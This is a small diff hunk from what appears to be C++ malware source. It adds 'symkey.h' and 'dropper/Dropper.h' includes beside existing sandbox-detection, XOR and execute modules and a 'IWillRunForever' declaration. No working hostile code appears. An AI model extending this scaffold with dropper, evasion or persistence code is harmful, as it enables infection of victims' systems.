@@ -24,6 +24,8 @@ using json = nlohmann::json;
 #include "execute/execute.h"
 #include "sandbox_detection/sandbox_detection.h"
 #include "xor/xor.h"
+#include "symkey.h"
+#include "dropper/Dropper.h"
 
 /* Functions */
 void IWillRunForever(void);
